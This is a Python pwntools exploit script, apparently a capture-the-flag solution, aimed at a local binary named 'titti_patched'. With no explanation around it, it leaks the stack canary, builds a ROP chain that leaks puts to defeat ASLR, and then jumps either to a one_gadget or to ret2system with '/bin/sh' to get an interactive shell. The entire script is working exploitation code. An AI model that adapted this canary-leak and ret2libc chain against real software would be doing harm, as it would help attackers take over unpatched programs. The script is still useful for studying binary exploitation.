from pwn import *

USE_ONEGADGET = False
load = log.progress("loading information")

elf = ELF("./titti_patched")
libc = ELF("./libc.so.6")

pop_rdi_ret = ROP(elf).find_gadget(["pop rdi", "ret"]).address
ret = ROP(elf).find_gadget(["ret"]).address

load.success("pop rdi; ret at 0x%x" % pop_rdi_ret)

p = process(elf.path)

# stage 1 - leak the canary
stage1 = log.progress("stage 1")

p.sendlineafter(">>", "Beer" + "A"*36)
p.recvuntil(b"A"*36)
canary = b"\x00" + p.recv(8)[1:]

canary = u64(canary)

stage1.success(f"canary {canary:x}")

# stage 2 - bypass ASLR
stage2 = log.progress("stage 2")

rop = p64(pop_rdi_ret)
rop += p64(elf.got["puts"])
rop += p64(elf.plt["puts"])
rop += p64(elf.symbols["main"])

p.send(b"aaaa" + b"a"*36 + p64(canary) + b"a"*8 + rop)

p.recvuntil("?\n")
r = p.recvline(keepends=False)

puts_leak = r.ljust(8,b"\x00")[:8]
puts_addr = u64(puts_leak)

libc.address = puts_addr - libc.symbols["puts"]

stage2.success("libc base address: " + hex(libc.address))


if USE_ONEGADGET:
    ### TECNICA ONE GADGET
    # return to the magic gadget
    # https://github.com/david942j/one_gadget
    log.info("magic gadget: " + hex(libc.address + 0x4f2c5))
    p.send(b"aaaa" + b"a"*36 + p64(canary) + b"a"*8 + p64(libc.address + 0x4f2c5))
else:

    ### TECNICA RET2SYSTEM
    bin_sh = next(libc.search(b"/bin/sh"))
    p.send(b"aaaa" + b"a"*36 + p64(canary) + b"a"*8 + p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(libc.symbols["system"]))

p.recv()

p.interactive()



